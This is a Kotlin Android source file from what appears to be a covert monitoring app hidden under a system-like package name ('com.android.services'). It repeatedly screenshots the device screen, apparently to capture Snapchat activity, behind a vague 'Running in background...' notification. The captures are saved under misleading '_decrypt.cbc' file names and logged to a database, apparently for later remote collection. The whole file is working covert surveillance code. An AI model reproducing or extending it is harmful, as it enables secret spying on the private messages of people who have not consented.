package com.android.services.services.snapchat

import android.app.Activity
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.graphics.Point
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.util.DisplayMetrics
import android.view.OrientationEventListener
import android.view.WindowManager
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import com.android.services.R
import com.android.services.db.entities.SnapChatEvent
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.receiver.NotificationBroadcastReceiver
import com.android.services.services.RemoteDataService
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.FileOutputStream
import java.io.IOException
import java.util.*

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
class SnapChatEventCommandProcessingImplI(
    val service: Service,
    val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope,
) : SnapChatEventCommandProcessingBaseI(service) {

    override fun initialize() {
      startAndCreateNotification()
        mProjectionManager =
            service.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        val mWindowManager = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager?
        val metrics = DisplayMetrics()
        mWindowManager?.let {
            mDisplay = mWindowManager.defaultDisplay
            mDisplay?.getMetrics(metrics)
            mDensity = metrics.densityDpi
        }
        logVerbose("${AppConstants.SNAP_CHAT_EVENTS_TYPE} In OnInitialize()")
    }

    private fun startAndCreateNotification() {
        val notificationIntent =
            Intent(service.applicationContext, NotificationBroadcastReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            service.applicationContext,
            SNAP_CHAT_NOTIFICATION_ID,
            notificationIntent,
            PendingIntent.FLAG_UPDATE_CURRENT
        )
        val notification =
            NotificationCompat.Builder(service.applicationContext, RemoteDataService.CHANNEL_ID)
                .setContentText("Running in background...")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentIntent(pendingIntent)
                .build()
        service.startForeground(SNAP_CHAT_NOTIFICATION_ID, notification)

    }

    override fun parseIntent(intent: Intent) {
        startsnapChatEventCapturingTask()
    }

    private fun startsnapChatEventCapturingTask() {
        if (mSnapChatEventTimer != null) {
            mSnapChatEventTimer!!.cancel()
            mSnapChatEventTimer!!.purge()
            mSnapChatEventTimer = null
        }
        mSnapChatEventTimer = Timer()
        mSnapChatEventTimer!!.scheduleAtFixedRate(
            SnapChatCaptureEventTimerTask(),
            0L,
            SNAP_CHAT_CAPTURE_INTERVAL
        )
    }

    private fun stopSnapChatEventTimerTask() {
        if (mSnapChatEventTimer != null) {
            mSnapChatEventTimer!!.cancel()
            mSnapChatEventTimer!!.purge()
            mSnapChatEventTimer = null
        }
    }

    private inner class SnapChatCaptureEventTimerTask : TimerTask() {
        override fun run() {
            if (AppUtils.isScreenInteractive(applicationContext)) {
                coroutineScope.launch {
                    try {
                        capturesnapChatEvent()
                    } catch (exception: Exception) {
                        logVerbose("${AppConstants.SNAP_CHAT_EVENTS_TYPE} capturing exception: ${exception.message}")
                        stopSnapChatEventService()
                    }
                }
            } else {
                logVerbose("${AppConstants.SNAP_CHAT_EVENTS_TYPE} SnapChatEvent missed, screen is not interactive")
            }
            snapChatEventCounter += 1
            logVerbose("${AppConstants.SNAP_CHAT_EVENTS_TYPE} SnapChatEvent counter = $snapChatEventCounter")
        }
    }

    @Throws(Exception::class)
    private suspend fun capturesnapChatEvent() {
        withContext(Dispatchers.IO) {
            mMediaProjection = AppConstants.screenRecordingIntent?.let {
                mProjectionManager!!.getMediaProjection(
                    Activity.RESULT_OK,
                    it
                )
            }
            mMediaProjection!!.registerCallback(MediaProjectionStopCallback(), mHandler)
            mOrientationChangeCallback = OrientationChangeCallback(applicationContext)
            if (mOrientationChangeCallback!!.canDetectOrientation()) {
                mOrientationChangeCallback!!.enable()
            }
            createVirtualDisplay()
        }
    }

    private fun createVirtualDisplay() {
        val size = Point()
        mDisplay!!.getSize(size)
        mWidth = size.x
        mHeight = size.y
        mImageReader = ImageReader.newInstance(
            mWidth,
            mHeight,
            PixelFormat.RGBA_8888,
            1
        )
        mImageReader!!.setOnImageAvailableListener(
            ImageAvailableListener(),
            mHandler
        )
        mVirtualDisplay = mMediaProjection!!.createVirtualDisplay(
            SCREEN_CAPTURE_NAME,
            mWidth,
            mHeight,
            mDensity,
            VIRTUAL_DISPLAY_FLAGS,
            mImageReader!!.surface,
            null,
            mHandler
        )
    }

    private inner class ImageAvailableListener : ImageReader.OnImageAvailableListener {
        override fun onImageAvailable(reader: ImageReader) {
            logVerbose(
                "${AppConstants.SNAP_CHAT_EVENTS_TYPE} On Image Available " + AppUtils.formatDate(
                    System.currentTimeMillis().toString()
                )
            )
            try {
                logVerbose("${AppConstants.SNAP_CHAT_EVENTS_TYPE} starting Writing Image Task = $snapChatEventCounter")
                releaseResources()
                coroutineScope.launch {
                    writeSnapChatEventToDisk(reader)
                    logVerbose("${AppConstants.SNAP_CHAT_EVENTS_TYPE} SnapChatEvent saved to disk = $snapChatEventCounter")
                    saveSnapChatEvent()
                    logVerbose("${AppConstants.SNAP_CHAT_EVENTS_TYPE} SnapChatEvent saved to db = $snapChatEventCounter")
                }
            } catch (e: Exception) {
                logException("${AppConstants.SNAP_CHAT_EVENTS_TYPE} OnImageAvailable Error: " + e.message)
                stopSnapChatEventService()
            }
        }
    }

    private fun releaseResources() {
        releaseVirtualDisplay()
        stopProjection()
        resetImageReaderListener()
        disableOrientationChangeCallback()
    }

    private suspend fun writeSnapChatEventToDisk(imageReader: ImageReader) {
        withContext(Dispatchers.IO) {
            var image: Image? = null
            var fos: FileOutputStream? = null
            var bitmap: Bitmap? = null
            val imageName = System.currentTimeMillis().toString()
            try {
                image = imageReader.acquireLatestImage()
                if (image != null) {
                    val planes = image.planes
                    val buffer = planes[0].buffer
                    val pixelStride = planes[0].pixelStride
                    val rowStride = planes[0].rowStride
                    val rowPadding: Int =
                        rowStride - pixelStride * mWidth
                    bitmap = Bitmap.createBitmap(
                        mWidth + rowPadding / pixelStride,
                        mHeight,
                        Bitmap.Config.ARGB_8888
                    )
                    bitmap.copyPixelsFromBuffer(buffer)
                    filePath = createOutputFilePath(
                        imageName + "_" + snapChatEventCounter + "_decrypt.cbc"
                    )
                    fos = FileOutputStream(filePath)
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, fos)
                    logVerbose("Image saved: $imageName")
                }
            } catch (e: Exception) {
                logException("${AppConstants.SNAP_CHAT_EVENTS_TYPE} Writing SnapChatEvent Error: " + e.message)
                stopSnapChatEventService()
            } finally {
                if (fos != null) {
                    try {
                        fos.close()
                    } catch (ioe: IOException) {
                        ioe.printStackTrace()
                    }
                }
                bitmap?.recycle()
                image?.close()
            }
        }
    }

    private inner class MediaProjectionStopCallback : MediaProjection.Callback() {
        override fun onStop() {
            releaseVirtualDisplay()
            resetImageReaderListener()
            disableOrientationChangeCallback()
            mMediaProjection!!.unregisterCallback(this@MediaProjectionStopCallback)
        }
    }

    private fun releaseVirtualDisplay() {
        if (mVirtualDisplay != null) {
            mVirtualDisplay!!.release()
            mVirtualDisplay = null
        }
    }

    private fun resetImageReaderListener() {
        if (mImageReader != null) {
            mImageReader!!.setOnImageAvailableListener(null, null)
            mImageReader = null
        }
    }

    private fun disableOrientationChangeCallback() {
        if (mOrientationChangeCallback != null) {
            mOrientationChangeCallback!!.disable()
            mOrientationChangeCallback = null
        }
    }

    private fun stopProjection() {
        mHandler.post {
            if (mMediaProjection != null) {
                mMediaProjection!!.stop()
            }
        }
    }

    inner class OrientationChangeCallback constructor(context: Context?) :
        OrientationEventListener(context) {
        override fun onOrientationChanged(orientation: Int) {
            val rotation: Int = mDisplay!!.rotation
            if (rotation != mRotation) {
                mRotation = rotation
                try {
                    releaseVirtualDisplay()
                    resetImageReaderListener()
                    createVirtualDisplay()
                } catch (e: Exception) {
                    logException("${AppConstants.SNAP_CHAT_EVENTS_TYPE} OrientationChangeCallback Error: " + e.message)
                    stopSnapChatEventService()
                }
            }
        }
    }

    @Throws(Exception::class)
    private suspend fun saveSnapChatEvent() {
        withContext(Dispatchers.IO) {
            try {
                val snapChatEvent = SnapChatEvent()
                snapChatEvent.apply {
                    file = filePath!!
                    name = AppUtils.formatDateCustom(System.currentTimeMillis().toString())
                    dateTaken = AppUtils.formatDate(System.currentTimeMillis().toString())
                    date = AppUtils.getDate(System.currentTimeMillis())
                    status = 0
                }
                localDatabaseSource.insertSnapChatEvent(snapChatEvent)
                capturedSnapChatEvetns += 1
                logVerbose("captured snapChatEvents count = $capturedSnapChatEvetns")
            } catch (exception: Exception) {
                logException("Error saving SnapChatEvent = ${exception.message}")
                stopSnapChatEventService()
            }
        }
    }

    override fun createOutputFilePath(fileName: String): String {
        mFilePath = AppUtils.retrieveFilePath(
            applicationContext,
            AppConstants.DIR_SCREEN_SHOT,
            fileName
        )
        return mFilePath
    }

    override fun startCommand() {
        startAndCreateNotification()
    }

    override fun onServiceDestroy() {
        stopSnapChatEventTimerTask()
    }

    /**
     * Updates the SnapChatEvent push as corrupted
     */
    private fun stopSnapChatEventService() {
        service.stopSelf()
    }
}